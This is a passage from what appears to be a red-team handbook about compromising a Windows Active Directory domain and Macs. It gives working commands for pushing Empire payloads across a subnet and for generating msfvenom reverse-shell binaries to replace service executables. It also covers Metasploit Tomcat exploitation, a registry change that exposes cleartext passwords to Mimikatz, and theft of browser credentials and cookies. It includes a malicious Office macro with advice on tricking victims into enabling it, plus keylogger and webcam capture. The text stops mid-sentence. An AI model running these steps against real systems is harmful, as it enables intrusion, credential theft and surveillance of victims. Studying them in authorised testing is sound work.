krb5-enum-\nusers.realm=\"cyberspacekittens.local\",userdb=/opt/userlist.txt\n<Domain Controller IP>\n \n \nWe will need to supply a list of usernames to test, but since we are only\nquerying the DC and not authenticating it, this activity is generally not\ndetected.  Now , we can take these user accounts and start password spraying\nagain!\n \nScanning the Network with CrackMapExec\n(CME)\nIf we don't have a compromised system yet, but we did gain credentials\nthrough Responder , misconfigured web app, bruteforcing, or a printer , then\nwe can try to sweep the network to see where this account can log in.  A\nsimple sweep using a tool like CrackMapExec (cme) can assis t in finding\nthat initial point of entry on the internal network. \n \nHistorically , we have used CME to scan the network, identify/authenticate\nvia SMB on the network, execute commands remotely to many  hosts, and\neven pull clear text creds via Mimikatz.  With newer features in both\nEmpire and CME, we can take advantage of Empire's REST feature.  In the\nfollowing scenario, we are going to spin up Empire with its REST API,\nconfigure the password in CME, have CME connect to Empi re, scan the\nnetwork with the single credential we have, and finally , if we do\nauthenticate, automatically push an Empire payload to the remote victim's\nsystem.  If you have a helpdesk or privileged account, get ready for a load\nof Empire shells!\n \nStart Empire's REST API server\ncd /opt/Empire\n./empire --rest --password 'hacktheuniverse'\nChange the CrackMapExec Password\ngedit /root/.cme/cme.conf\npassword=hacktheuniverse\nRun CME to spawn Empire shells\ncme smb 10.100.100.0/24 -d 'cyberspacekittens.local'\n-u '<username>' -p '<password>' -M empire_exec -o\nLISTENER=http\n \n \nAfter Compromising Your Initial Host\nAfter you have gained access to a host via social engineering, drop boxes,\nresponder , attack ing printers or other attacks, what do you do next?  That is\nalways the million dollar question.\n \nIn the past, it was all about understanding where you are and your\nimmediate surro unding network.  We may initially run commands similar to\n\"netstat -ano\" to find the locations of our IP ranges of the victim's servers,\ndomains, and user.  We can also run commands like \"ps\" or \"sc queryex\ntype= service state= all | find \"_NAME\"\" to list all the running services and\nlook for AV or other host base protections.  Here are some other example\ncommands we might initially run:\n \nNetwork information:\nnetstat -anop | findstr LISTEN\nnet group \"Domain Admins\" /domain\n \nProcess List:\ntasklist /v\n \nSystem Host Information:\nsysinfo\nGet-WmiObject -class win32 operatingsystem | select -property\n* | exportcsv c:\\temp\\os.txt\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n \nSimple File Search:\ndir /s *password*\nfindstr /s /n /i /p foo *\nfindstr /si pass *.txt | *.xml | *.ini\n \nInformation From Shares/Mounted Drives:\npowershell -Command \"get-WmiObject -class W in32_Share\"\npowershell -Command \"get-PSDrive\"\npowershell -Command \"Get-WmiObject -Class\nWin32_MappedLogicalDisk | select Name, ProviderName”\n \nLet's be real here, no one has time to remember all of these commands, but\nwe are in luck!  I believe, based on the RTFM book (great resource), leostat\ncreated a quick Python script that has a ton of these handy comm ands easily\nsearchable in a tool called rtfm.py (https://github.com/leostat/rtfm).\n \nUpdate and Run R TFM\ncd /opt/rtfm\nchmod +x rtfm.py\n./rtfm.py -u\n./rtfm.py -c 'rtfm'\nSearch all T ags\n./rtfm.py -Dt\nLook at all the queries/commands per tag.  One I like to use is\nthe Enumeration category\n./rtfm.py -t enumeration | more\n \n \nNow , RTFM is pretty extens ive and has a lot of different helpful\ncommands.  This is a great quick resource during any campaign. \n \nThese are all the things we have been doing forever to get information, but\nwhat if we could get much more from the environment?  Using PowerShell,\nwe can gain the network/envir onment information that we need.  Since\nPowerShell can be easily execu ted from any of the C2 tools, you can use\nEmpire, Metaspl oit, or Cobalt Strike to perform these labs.  In the following\nexamples, we will be using Empire, but feel free to try other tools.\n \nPrivilege Escalation\nThere are plenty of different ways to go from a regular user to a privileged\naccount. \n \nUnquoted Service Paths:\nThis is a fairly easy and common vulnerability where the service\nexecutable path is not surrounded by quotes.  This is abused\nbecause, without quotes around the path, we can abuse a current\nservice.  Let's say we have a service that is configured to execute\nC:\\Program Files (x86)\\Cyber Kittens\\Cyber Kittens.exe.  If we\nhave write permissions into the Cyber Kittens folder , we can\ndrop malware to be located at C:\\Program Files (x86)\\Cyber\nKittens\\Cyber .exe (notice that Kittens.exe is missing).   If the\nservice runs at system, we can wait until the service restarts, and\nhave our malware run as a privileged account.\nHow to Find V ulnerable Service Paths:\nwmic service get\nname,displayname,pathname,startmode |findstr /i\n\"Auto\" |findstr /i /v \"C:\\W indows\\\\\" |findstr /i /v \"\"\"\nLook for BINAR Y_PATH_NAME\n \nFinding Insecure Registry Permissions for Services:\nIdentify weak permissions that allow update of service Image\nPath locations\n \nCheck if the AlwaysInstallElevated registry key is enabled:\nChecks the AlwaysInstallElevated registry keys which dictates if\n.MSI files should be installed with elevated privileges (NT\nAUTHORITY\\SYSTEM)\nhttps://github.com/rapid7/metasploit-\nframework/blob/master/modules/exploits/windows/local/always\n_install_elevated.rb\n \nNote that we don't really have to do these manually as a few good\nMetasploit and PowerShell modules have been created especially for\nWindows.  In the following example, we are going to take a look at\nPowerUp PowerShell script\n(https://github.com/EmpireProject/Empire/blob/master/data/module_source/\nprivesc/PowerUp.ps1).  In this case, the script is in conjunction with Empire\nand will run all common areas of misconfiguration that allow for a regular\nuser to get a local administrative  or system account.  In the example below ,\nwe ran this on our victim system and saw that it had some unquoted service\npaths for localsystem.  Now , we might not be able to restart the service, but\nwe should be able to abuse the vulnerability and wait for a reboot.\n \nEmpire PowerUp Module:\nusermodule privesc/powerup/allchecks\n \n \nWhat sticks out right away:\n \nServiceName                    : WavesSysSvc\nPath                           : C:\\Program\nFiles\\W aves\\MaxxAudio\\W avesSysSvc64.exe\nModifiableFile                : C:\\Program\nFiles\\W aves\\MaxxAudio\\W avesSysSvc64.exe\nModifiableFilePermissions : {W riteOwner , Delete, W riteAttributes,\nSynchronize...}\nModifiableFileIdentityRefer ence : Everyone\nStartName                      : LocalSystem\n \nIt looks  like the WavesSysSyc service is writeable by every one.  That\nmeans we can replace the WaveSysSvc64.exe file with a malicious binary\nof our own: \n \nCreate a Meterpreter Binary (will discuss later how to get\naround A V)\nmsfvenom -p windows/meterpreter/reverse_https\nLHOST=[ip] LPOR T=8080 -f exe > shell.exe\nUpload the binary using Empire and replace the original binary\nupload ./shell.exe C:\\\\users\\\\test\\\\shell.exe\nshell copy C:\\users\\test\\Desktop\\shell.exe\n\"C:\\Program\nFiles\\W aves\\MaxxAudio\\W avesSysSvc64.exe\"\nRestart Service or wait for a reboot\n \nOnce the service restarts, you should get your Meterpreter shell back as\nsystem!  Using PowerUp, you will find many different services that are\npotentially vulnerable to privile ge escalation.  If you want a deeper primer\non the underlying issues with Windows privesc, check out FuzzSecurity's\narticle: http://www .fuzzysecurity .com/tutorials/16.html. \n \nFor unpatched Windows systems, we do have some go-to privilege\nescalation attacks like (https://github.com/FuzzySecurity/PowerShell-\nSuite/blob/master/Invoke-MS16-032.ps1) and\n(https://github.com/FuzzySecurity/PSKernel-\nPrimitives/tree/master/Sample-Exploits/MS16-135), but how do we quickly\nidentify what patches are insta lled on a Windows system?  We can use\ndefault comman ds on our victim  system to see what service packages are\ninstalled.  Windows comes with a default command “systeminfo” that will\npull all the patch history for any given Windows host.  We can take that\noutput, push it to our Kali system and run Windows Exploit Suggester to\nfind known exploits against those vulnerabilities. \n \nBack on your W indows 10 V ictims system:\nsysteminfo\nsysteminfo > windows.txt\nCopy windows.txt to your Kali box under /opt/W indows-\nExploit-Suggester\npython ./windows-exploit-suggester .py -i ./windows.txt -d 2018-\n03-21-mssb.xls\n \n \nThis tool hasn't been actively maintained in a little while, but you can easily\nadd the privilege escalation vulnerabilities you are looking for .\n \nIn cases where we are in a completely patched Windows envir onment, we\nfocus on different privilege escalation vulnerabilities in third party software\nor any 0-day/n ew vulnerabilit ies for the OS.  For example, we are\nconstantly looking for vulnerabilities like this, http://bit.ly/2HnX5id, which\nis a Privilege Escalation in Windows that looks like it is not patched at this\ntime.  Usually in these scenarios , there might be some basic POC code, but\nit is up to us to test, validate, and many times finish the exploit.  Some of\nthe areas we regularly monitor for public privilege escalations\nvulnerabilities:\nhttp://insecure.or g/search.html?q=privilege%20escalation\nhttps://bugs.chromium.or g/p/project-zero/issues/list?\ncan=1&q=escalation&colspec=ID+T ype+Status+Priority+Milest\none+Owner+Summary&cells=ids\n \nOften, it is just about timing . For example, when a vulnerability is\ndiscovered, that may be your limited window of opportunity to further\ncompromise the system before it is patched. \n \nPrivilege Escalation Lab\nThe best lab to test and try different privilege escalation vulnerabilities is\nMetasploitable3 (https://github.com/rapid7/metasploitable3) by Rapid7. \nThis vulnerable framework automatically builds a Windows VM with all\nthe common and some uncomm on vulnerabilities.  It does take a bit to set\nup, but once the VM is configured, it is a great testing lab.\n \nTo walk you through a quick example and to get you started:\nnmap the Metasploitable3 box (make sure to do all ports as you\nmight miss some)\nYou will see ManageEngine running on port 8383\nStart Up Metasploit and search for any ManageEngine\nvulnerabilities\nmsfconsole\nsearch manageengine\nuse\nexploit/windows/http/manageengine_connectionid_wr\nite\nset SSL T rue\nset RPOR T 8383\nset RHOST <Y our IP>\nexploit\ngetsystem\nYou will notice that you cannot get to system because the service\nyou compromised is not running as a privileged process.  This is\nwhere you can try all dif ferent privilege escalation attacks. \nOne thing we do see is that Apache T omcat is running as a\nprivileged process.  If we can abuse this service, we may be able\nto execute our payload as a higher service.  W e saw that Apache\nTomcat was running on the outside on port 8282, but it needed a\nusername and password.  Since we do have a userland shell, we\ncan try to search for that password on disk.  This is where we\ncan search the internet or Google \"Where are T omcat Passwords\nStored\".  The result, tomcat-users.xml.\nOn the victim box, we can search and read the tomcat-users.xml\nfile:\nshell\ncd \\ && dir /s tomcat-users.xml\ntype \"C:\\Program Files\\Apache Software\nFoundation\\tomcat\\apache-tomcat-\n8.0.33\\conf\\tomcat-users.xml\nLet’s now attack T omcat with the passwords we found.  First,\nlog into the T omcat management console on port 8282 and see\nthat our password worked.  W e can then use Metasploit to\ndeploy a malicious W AR file via T omcat.\nsearch tomcat\nuse exploit/multi/http/tomcat_mgr_upload\nshow options\nset HTTPusername sploit\nset HTTPpassword sploit\nset RPOR T 8282\nset RHOST <Metasploitable3_IP>\nset Payload java/shell_reverse_tcp\nset LHOST <Y our IP>\nexploit\nwhoami\nYou should now be System.  W e took advantage of a third party\ntool to privilege escalate to System.\n \nPulling Clear T ext Cr edentials fr om Memory\nMimikatz (https ://github.com/gentilkiwi/mimikatz) has been around for a\nwhile and changed the game in terms of getting passwords in clear text. \nPrior to Windows 10, running Mimikatz on a host system as a local\nadministrator allowed an attacker to pull out clear text passwords from\nLSASS (Local Security Authority Subsystem Service).  This worked great\nuntil Windows 10 came along and made it inaccessible to read from, even\nas local admin.  Now , there are some odd use cases I have seen where\nSingle Sign-On (SSO) or some unique software puts the passwo rds back in\nLSASS for Mimikatz to read, but we will ignore this for now.  In this\nchapter , we are going to talk about what to do when it doesn't work (like\nWindows 10). \n \nLet’s say you have compromised a Windows 10 workstation and privilege\nescalated to a local admin.  By default, you would have spun up Mimikatz\nand, per the query below , see that the password fields are NULL. \n \nSo what  can you do?  The easiest option is to set the registry key to put the\npasswords back in LSASS.  Within HKLM there is a UseLogo nCredential\nsetting that if set to 0, will store credentials back in memory\n(http://bit.ly/2vhFBiZ):\nreg add\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\\nWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\nIn Empire, we can run this via the shell command:\nshell reg add\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Security\nProviders\\WDigest /v UseLogonCredential /t\nREG_DWORD /d 1 /f\n \nThe problem with this setting is that we will need the user to re-login to the\nsystem.  You could cause a screen timeout, reboot, or logof f, so that you\nwill be able to capture clear text credentials again.  The easiest way though\nis to lock their workstation (so they don't lose any of their work . . . see how\nnice we are?).  T o trigger a lock screen:\nrundll32.exe user32.dll,LockW orkStation\n \nOnce we cause the lock screen and have them re-log back in, we can re-run\nMimikatz with clear text passwords.\n \nWhat if we can't get to a local administrative account?  What are some other\noptions we have to get a user's credentials?   Back in the day, a common\npentesting attack  was to look in userland memory at thick clients to see if\ncredentials were  stored in clear text.  Now that everything is browser based,\ncan we do the same in the browser? \n \nThis is where putterpanda put a cool POC style tool together to accomplish\njust this, called Mimikittenz (https://github.com/putterpanda/mimikittenz).\nWhat Mimikittenz does is it utilizes the Windows function\nReadProcessMemory() in order to extract plain-text passwords from various\ntarget processes such as browsers.\n \nMimikittenz has a great deal of memory search queries preloaded for\nGmail, Office365, Outlook Web, Jira, Github, Bugzilla, Zendesk, Cpanel,\nDropbox, Microsoft OneDrive, AWS Web Services, Slack, Twitter , and\nFacebook.  It is also easy to write your search expressions within\nMimikittenz.\n \nThe best part of this tool is that it does not require local administrative\naccess as it is all userland memory .  Once we have compromised a host, we\nwill import Mimikittenz into memory , and run the Invoke-mimikittenz\nscript. \n \n \nAs seen above, the user had Firefox logged into Github and we were able to\npull their userna me and password from the browser's memory .  Now , I hope\neveryone can take this tool to the next level and create more search queries\nfor dif ferent applications. \n \nGetting Passwords from the Windows Credential Store and\nBrowsers\nThe Windows Credential Store is a default feature of Window s that saves\nusernames, passwords, and certificates for systems, websites, and servers. \nWhen you have authenticated into a website using Microsoft IE/Edge, you\nnormally get a pop-up that asks \"do you want to save your passw ord?\"  The\nCredential Store  is where that information is stored.  Within the Credential\nManager , there are two types of credentials: Web and Window s.  Do you\nremember which user has access to this data?  It is not system, but the user\nwho is logged in who can retrieve this information.  This is great for us, as \nwith any phish or code executio n, we are usually in rights of that person. \nThe best part is that we don't even need to be a local administrator to pull\nthis data.  \n \nHow can we pull this informa tion?  There are two different PowerShell\nscripts we can import to gather this data:\nGathering W eb Credentials:\nhttps://github.com/samratashok/nishang/blob/master/\nGather/Get-W ebCredentials.ps1\nGathering W indows Credentials (Only does type Generic not\nDomain):\nhttps://github.com/peewpw/Invoke-\nWCMDump/blob/master/Invoke-WCMDump.ps1\n \n \nAs you can see from the dump, we pulled both their Face book-stored\ncredential and any generic credentials they have.  Remember , for the web\ncredentials, Get-W ebCredential s will only get passwords from Internet\nExplorer/Edge.  If we need to get it from Chrome, we can use the Empire\npayload powershell/collection /ChromeDump.  Prior to getting\nChromeDump to work, you will first need to kill the Chrome process and\nthen run ChromeDump.  Lastl y, I love to pull all browser history and\ncookies.  Not only can we learn a great deal about their internal  servers, but\nalso, if their sessions are still alive, we can use their cookies and\nauthenticate without ever knowing their passwords! \n \nUsing a PowerShell script like: https://github.com/sekirkity/BrowserGather ,\nwe can extract all the Browser Cookies, steal them, and tunnel our browser\nto take advantage of these cookies, all without privilege escalating. \n \n \nNext, we can even start looking for servers and credentials in all the third\nparty software that might be installed on the victim's system.  A tool called\nSessionGopher (https://github .com/fireeye/SessionGopher) can grab\nhostnames and saved passwords from WinSCP , PuTTY , SuperPuTTY ,\nFileZilla, and Microsoft Remote Desktop.  One of the other included\nfeatures also included is the ability to remotely grab local credentials off\nother systems on the network.  The easiest way to launch SessionGopher is\nto import the PowerShell script and execute using:\nLoad PowerShell File:\n. .\\SessionGopher .ps1\nExecute SessionGopher\nInvoke-SessionGopher -Thorough\n \nThese are just a few ways we can get credentials from the host system\nwithout ever privilege escala ting, bypassing UAC, or turning on a\nkeylogger .  Since we are in context of the user, we have access to many of\nthe resources on the host machine to help us continue our path to\nexploitation. \n \nGetting Local Cr eds and Information fr om OSX\nMost of the lateral movement within the THP focuses on Windows.  This is\nbecause almost all of the medium to large environments utilize Active\nDirectory to manage their syste ms and hosts.  We do come across Macs\nmore and more each year and want to make sure to include them as well. \nOnce inside an environment, many of the attacks are similar to those in the\nWindow's world (i.e. scanning for default creds, Jenkin/Application attacks,\nsniffing the network, and laterally moving via SSH or VNC).\n \nThere are a few payloads that support Macs and one of my favorites is\nusing Empire.  Empire can gene rate multiple payloads to trick your victim\ninto executing our agents.  Thes e include ducky scripts, applications, Office\nmacros, Safari launchers, pkgs, and more.  For example, we can create an\nOffice Macro similar to what we have done in Windows in PowerShell\nEmpire:\n \n1. Launch Empire\n2. First, make sure to set up your Empire Listener as we did at the\nbeginning of the book\n3. Next, we need to build an OSX Macro payload\n1. usestager osx/macro\n4. Set an OutFile to write to your local file system\n1. set OutFile /tmp/mac.py\n5. Generate the Payload\n \n \nIf you take a look at the generated Office macro, you will see that it is just\nBase64 code that is executed by Python.  Luckily for us, Python is a default\napplication on Macs and when this Macro is executed, we should get our\nagent beacon. \n \nTo create the malicious Excel file in Mac, we can open a new Excel\nworksheet, Go to Tools, View Macros, Create a Macro in This Workbook,\nand once Microsoft Visual Basic opens up, delete all current code and\nreplace it with all your new Macro code.  Finally , save it as an xlsm file.\n \n \nNow , send off your Malicious file to your victim and watch the Empire\nagents roll in.  On the victim side, once they open the Excel file, it will look\nsomething like this:\n \nMake sure you create a reasonable story to have them click Enable Macros.\n \nOnce your agent connects back  to your Empire server , the reconnaissance\nphase it pretty similar .  We are going to need to:\nDump Brower information and passwords: usemodule\ncollection/osx/browser_dump\nEnable a Keylogger: usemodule collection/osx/keylogger\nCause an App prompt for password capture: usemodule\ncollection/osx/prompt\nAlways helps to use their camera to take a picture: usemodule\ncollection/osx/webcam\n \nLiving Off of the Land in a Windows Domain\nEnvironment\nAgain, in our examples below , we are going to be using PowerShell\nEmpire.  However , you can also use Metasploit, Cobalt Strike, or similar to\ndo the same style attacks.  It doesn't really matter as long as you have the\nability to import PowerShell scripts into memory and evade whatever the\nhost system protections are. \n \nNow that you have compromised your victim, stolen all the secrets from\ntheir workstation, learned about some of the sites your victim browses, and\nrun some netstat style recon… what's next? \n \nFor a Red Teamer , it is really about finding reliable information on servers,\nworkstations, users, services, and about their Active Directory\nenvironment.  In many cases, we can't run any vulnerability scans or even\nan nmap  scan due to the risk of getting alerted/caught.  So, how can we\nutilize \"features\" of the networks and services to find all the information we\nneed?\n \nService Principal Names\nService Principal Names, or SPN, is a feature in Windows that allows a\nclient to uniquely identify the instance of a service.  SPNs are used by\nKerberos authentication to assoc iate a service instance with a service logon\naccount [https://msdn.microsoft.com/en-\nus/library/ms677949(v=vs.85).aspx].  For example, you might have an SPN\nfor service accounts that run MSSQL servers, HTTP servers, print servers,\nand others.  For an attacker , querying SPN is a vital part of the enumeration\nphase.  This is because any domain user account can query AD for all the\nservice accounts/servers that are associated with Active Directory .  We can\nidentify all the databases and web servers without having to scan a single\nhost!\n \nAs an attacker , we can take advantage of these \"features\" to query Active\nDirectory .  From any domain-joined computer , an attacker can run the\nsetspn.exe file to query AD.  This file is a default Windows binary and is on\nall modern W indows systems.\nsetspn -T [DOMAIN] -F -Q */*\nSwitches:\n-T = Perform query on the specified domain\n-F = Perform queries at the AD forest, rather than\ndomain level\n-Q = execute on each tar get domain or forest\n*/* = Everything\n \nWhat type of information do we see from setspn?  Below , running the\nsetspn command, we see information about the services running on the\ndomain controll er, information about a workstation, and we also found a\nserver named CSK-GITHUB.  In this example, we can see that there is an\nHTTP service running on that host machine.  If this had been on a different\nport, but still the same protocol, that information would have been listed as\nwell.\n \n \nSetspn will not only provide useful information about service users and all\nthe hostnames in AD, but it will also tell us which services are running on\nthe systems and even the port.  Why do we need to scan the network if we\ncan get most of the information directly from AD for services and even\nports?  What are some of the things that you might attack right away? \nJenkins? T omcat?  ColdFusion?\n \nQuerying Active Dir ectory\nI don't know how many times I have found a single domain user account\nand password, only to be told by IT that it is just a domain user account\nwith no other privileges and not to worry .  We have found these types of\naccounts on printers, shared kiosk workstations, flat file texts with\npasswords for services, configu rations files, iPads, web apps that have the\npasswords within the source of the page, and so much more.  But what can\nyou do with a basic domain user account with no other group memberships?\nGet Mor e Detailed Information About Users in AD\nWe can use a tool called PowerV iew (http://bit.ly/2JKTg5d)  created by\n@harmj0y to do all the dirty work for us.  PowerV iew is a PowerShell tool\nto gain network situational awareness on Windows domains. It contains a\nset of pure-PowerShell replacements for various Windows \"net *\"\ncommands, which utilizes PowerShell AD hooks and underlying Win32\nAPI functions to perform useful Windows domain functionality\n[http://bit.ly/2r9lYnH].  As an attacker , we can leverage PowerV iew and\nPowerShell to query AD, which  can be done with the lowest permissioned\nuser in AD, \"Domain Users\" , and even without local administrator\npermissions. \n \nLet's walk throu gh an example of how much data we can get with this low-\nlevel user.  To get started, we already have Empire running (you could\nreplicate this in Metasploit, Cobalt Strike, or similar) and executed a\npayload on our victim system.  If you have never set up Empire before,\ncheck out The Setup chapter on setting up Empire and Empire payloads. \nOnce we have our agent comm unicating with our Command and Control\nserver , we can type \"info\" to find out information about our victim.  In this\ncase, we have compromised a host running a fully patched Windows 10\nsystem, with a username of neil.pawstrong, on the cyberspacekitten's\ndomain.\n \n \nNext, we want to query inform ation from the domain without raising too\nmuch suspicion.  We can use the PowerV iew tools within Empire to get\ninformation.  PowerV iew queries the Domain Controller (DC) to get\ninformation on users, groups, computers, and more.  The PowerV iew\nfeatures that we will be using will only query the Domain Controller and\nshould look like normal traf fic.\n \nWhat modules are available under Empire for situational awareness?\n \n \nWe can start with the PowerV iew script called get_user .  Get_ user queries\ninformation for a given user or users in the specified domain.  By using the\ndefault settings,  we can get a dump of all information about users in AD\nand associated information.\n \nModule: situational_awareness/network/powerview/get_user\n \n \nIn the dump above, we can see information on one of the users, Purri\nGagarin.  What type of information did we get?  We can see their\nsamaccountname or username, when their password was changed, what\ntheir object category is, what membersof they are part of, last login, and\nmore.  With this basic user dump, we can get significant amount of\ninformation from the directory service.  What other type of information can\nwe get? \n \nModule: situational_awareness/network/powerview/get_group_member\n \nGet_group_member returns the members of a given group, with the option\nto \"Recurse\" to find all effective group members.  We can use AD to find\nspecific users of certain groups .  For example, with the following Empire\nsettings, we can search for all Domain Admins and groups that are part of\nthe Domain Admin group:\ninfo\nset Identity \"Domain Admins\"\nset Recurse T rue\nset FullData T rue\nexecute\n \n \nNow , we have a list of users, groups, servers and services.  This will help us\nmap which users have which privileges.  However , we still need detailed\ninformation about workstations and systems.  This could include versions,\ncreation dates, usage, hostnames, and more.  We can get this information on\na module called get_computer .\n \nModule: situational_awareness/network/powerview/get_computer\nDescription: The get_computer module queries the domain for current\ncomputer objects.\n \n \nWhat informati on do we gain from having get_computer querying the\nDomain Controller?  Well, we see that we gained informatio n about the\nmachine, when it was created, DNS hostnames, the distinguished names,\nand more.  As an attacker , one of the most helpful recon details is obtaining\noperating system types and operating system versions.  In this case, we can\nsee that these systems are on Windows 10 and on Build 16299.  We can\ntake this information and find out how recent the OS is and if they are being\nactively patched on Microsoft's release info page:\nhttps://technet.microsoft.com/en-us/windows/release-info.aspx. \n \nBloodhound/Sharphound\nHow can we take all the inform ation we gathered from our reconnaissance\nphase to create a path of exploitation?  How can we easily and quickly\ncorrelate who has access to what?  Back in the day, we used to just try and\ncompromise everything to get to where we want, but that always increased\nthe likelihood of getting caught. \n \nAndrew Robbin s, Rohan Vazarkar , and Will Schroeder have created one of\nthe best tools for correlation called Bloodhound/Sharphound .  Per their\nGithub page, \"BloodHound uses graph theory to reveal the hidde n and often\nunintended relationships within an Active Directory environment. Attackers\ncan use BloodH ound to easily identify highly complex attack paths that\nwould otherwise be impossible to quickly identify . Defenders can use\nBloodHound to identify and eliminate those same attack paths. Both blue\nand red teams can use BloodHound to easily gain a deeper understanding of\nprivilege relationships in an Active Directory environment.”\n[https://github.com/BloodHoundAD/BloodHound]\n \nBloodhound works by running an Ingestor on a victim system, and then\nqueries AD (similar to what we previously did manually) for users, groups,\nand hosts.  The Ingestor will then try to connect to each system to\nenumerate logge d in users, sessions, and permissions.  Of course, this is\ngoing to be pretty loud on the network.  For a medium- large sized\norganization on the default setting (which can be modified), it can take less\nthan 10 minutes to connect to every host system and query information\nusing Sharphoun d.  Note, since this touches every domain-joined system on\nthe network, it could get you caught.  There is a Stealth option in\nBloodhound that will only query  Active Directory and not conn ect to every\nhost system, but the output is pretty limited.\n \nThere are curren tly two different versions (of which I'm sure the old one\nwill soon be removed):\nInside Empire, you can use the module:\nusemodule\nsituational_awareness/network/bloodhound\nThis still uses the old PowerShell version that is very\nslow\nThe better option is Sharphound.  Sharphound is the C# version\nof the original Bloodhound Ingester .  This one is much faster\nand stable.  This can be used as a stand-alone binary or imported\nas a PowerShell script.  The Sharphound PowerShell script will\nuse reflection and assembly .load to load the compiled\nBloodHound C# ingestor into memory .\nhttps://github.com/BloodHoundAD/BloodHound/tree/\nmaster/Ingestors\n \nTo run the Bloodhound/Sha rphound Ingestor , there are multiple\nCollectionMethods you might need to specify:\nGroup - Collect group membership information\nLocalGroup - Collect local admin information for computers\nSession - Collect session information for computers\nSessionLoop - Continuously collect session information until\nkilled\nTrusts - Enumerate domain trust data\nACL - Collect ACL (Access Control List) data\nComputerOnly - Collects Local Admin and Session data\nGPOLocalGroup - Collects Local Admin information using\nGPO (Group Policy Objects)\nLoggedOn - Collects session information using privileged\nmethods (needs admin!)\nObjectProps - Collects node property information for users and\ncomputers\nDefault - Collects Group Membership, Local Admin, Sessions,\nand Domain T rusts\n \nTo run Blood/Sharphound, on the host system:\nRun PowerShell and then either import Bloodhound.ps1 or\nSharpHound.ps1:\nInvoke-Bloodhound -CollectionMethod Default\nInvoke-Bloodhound -CollectionMethod\nACL,ObjectProps,Default -CompressData -\nRemoveCSV -NoSaveCache\nRun the Executables:\nSharpHound.exe -c\nDefault,ACL,Session,LoggedOn,T rusts,Group\n \nOnce Bloundhound/Sharphound is finished, four files will be dropped onto\nthe victim system.  Grab those files and move them onto your Kali box. \nNext, we need to start our Neo4j server and import this data to build our\ncorrelation graphs.\n \nStart Bloodhound\n1. apt-get install bloodhound\n2. neo4j console\n3. Open Browser to http://localhost:7474\n1. Connect to bolt://localhost:7687\n2. Username: neo4j\n3. Password: neo4j\n4. Change Password\n4. Run Bloodhound at a T erminal:\n1. bloodhound\n2. Database URL: bolt://127.0.0.1:7687\n3. Username: neo4j\n4. Password: New Password\n5. Load Data:\n1. On the right hand side, there is an \"Upload Data\"\nbutton\n2. Upload acls.csv , group_membership.csv ,\nlocal_admin.csv , and sessions.csv\n \nIf you don't have a domain to test this on, I have upload ed the four\nBloodhound files here: https://github.com/cyberspacekittens/bloodhound ,\nso that you can repeat the exercises.  Once inside Bloodhound and all the\ndata is imported, we can go to the Queries to look at the \"Find Shorted\nPaths to Domain Admin\".   We can also pick specific users and see if we\ncan map a path to that specific user or group.  In our case, the first box we\ncompromised is\nNEIL.P AWSTRONG@CYBERSP ACEKITTENS.LOCAL.  In the search\nbar, we insert that user, click the \"Pathfinding\" button, and type \"Domain\nAdmin\" (or any other user) to see if we can route a path between these\nobjects.\n \n \nAs you can see from Neil's machine, we can pivot all the way to the CSK-\nLab.  Once on the lab box, there  is a user called Purri, who is a member of\nthe HelpDesk group.\n \nIf we can comp romise the Helpdesk group, we can pivot to Chris' system,\nwho also has Elon Muskkat currently logged in.  If we can migrate to his\nprocess or steal his clear text password, we can elevate to Domain Admin!\n \nFrom large networks, we have noticed limitations and searching issues with\nthe Bloodhound  queries.  One great benefit of using Neo4j is that it allows\nfor raw queries through its own language called Cypher .  An in-depth look\ninto Cypher for custom queries can be found here: \nhttps://blog.cptjesus.com/posts/introtocypher . \n \nWhat kind of custom queries can we add?  Well, @porterhau5 has made\nsome great progress in extending Bloodhound to track and visualize your\ncompromises.  Check out their article here:\nhttps://porterhau5.com/blog/extending-bloodhound-track-and-visualize-\nyour-compromise/. \n \nFrom a high level, @porterhau 5 added the idea of tagging compromised\nhosts to help facilitate better pivoting through the environ ment.  For\nexample, in this fake scenario, we compromised the initial user by phishing\nthe user niel.pawstrong. Using the Cypher language and Raw Query feature\non the Bloodhound app, we can run these queries:\nAdding an Owned T ag to a Compromised System:\nMATCH (n) WHERE\nn.name=\"NEIL.P AWSTRONG@CYBERSP ACEKIT\nTENS.LOCAL\" SET n.owned=\"phish\", n.wave=1\nRunning a Query to show all owned systems that were phished\nMATCH (n) WHERE n.owned=\"phish\" RETURN n\n \nNow , we can add some custom queries to Bloodhound.  On the Queries tab\nof Bloodhound,  scroll to the bottom and click the edit button next to\n\"Custom Queries\".  Replace all the text with the contents from:\nhttps://github.com/porterhau5/BloodHound-\nOwned/blob/master/customqueries.json\n \nAfter we save, we should have  many more queries created.  We can now\nclick on \"Find Shortest Path from owned node to Domain Admin\". \n \n \n \nIf you want to look into this more closely , check out @porterhau5's forked\nversion of Bloodhound.  It makes tagging compromised machines much\nprettier and allows for more custom functionality:\nhttps://github.com/porterhau5/BloodHound-Owned. \n \nSo far, without scanning, we have been able to gain a great deal of\ninformation about the organization.  This is all with rights as the local AD\nuser (domain users) and for the most part, none of the network traffic looks\ntoo suspicious.  As you can see, we were able to do all this without being a\nlocal administrator or having any administrative rights on the local system.\nAdvanced ACL/ACE Bloodhound\nWhen using Bloodhound's Collection Method Access Control List (ACL)\ntype, our script will query AD to gather all the access control permissions\non users/objects.  The information we gather from Access Control Entries\n(ACEs) describe s the allowed and denied permissions for users, groups, and\ncomputers.  Finding and abusing ACEs can be an entire book on its own,\nbut here are a couple of good starting resources:\nBloodHound 1.3 – The ACL Attack Path Update\nhttps://wald0.com/?p=112\nIntroducing the Adversary Resilience Methodology\nhttp://bit.ly/2GYU7S7\n \nWhat are we looking for when importing ACL data into Bloodhound? \nBloodhound identifies areas where weaknesses might exist in ACEs.  This\nwill include who has the ability to change/reset passwords, add members to\ngroups, update objects like the scriptPath for other users, update object or\nwrite a new ACE on an object, and more. \n \nHow might you use this?  When compromising boxes and gaining\nadditional credentials, we can target paths to find a user that has the ability\nto reset passwords or modify ACE permissions.  This will lead to creative\nways to find paths to Domain Admin or privileged accounts, and even allow\nfor settin g up backdoors to be used later.   A great resource to learn more\nabout these types of abuses is: Robbins-An-ACE-Up-The-Sleeve-\nDesigning-Active-Directory-DACL-Backdoors presentation\n(http://ubm.io/2GI5EAq).\n \nMoving Laterally - Migrating Pr ocesses\nOnce on a box with multiple users, it is common practice to either make\ntokens or migrate tokens of dif ferent users.  This is nothing new , but heavily\nused to move laterally within an environment.  Usually from 